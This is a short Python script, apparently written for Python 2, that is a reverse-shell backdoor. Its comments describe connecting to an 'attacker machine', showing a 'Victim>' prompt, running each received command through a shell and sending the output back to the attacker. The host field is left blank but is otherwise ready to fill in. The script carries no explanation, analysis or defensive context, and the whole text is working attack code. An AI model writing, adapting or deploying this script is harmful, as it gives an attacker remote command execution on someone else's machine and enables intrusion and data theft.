
import socket,subprocess,sys
HOST = ''    # The remote host
PORT = 443            # The same port as used by the server
if HOST and PORT:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # connect to attacker machine
    s.connect((HOST, PORT))
    # send we are connected
    s.send('[*] Connection Established!')
    # start loop
    while True:
        s.send("Victim>")
        # recieve shell command
        data = s.recv(1024)
        # if its quit, then break out and close socket
        if data == "quit": break
        # do shell command
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        # read output
        stdout_value = proc.stdout.read() + proc.stderr.read()
        # send output to attacker
        s.send(stdout_value)
    # close socket
    s.close()
sys.exit(1)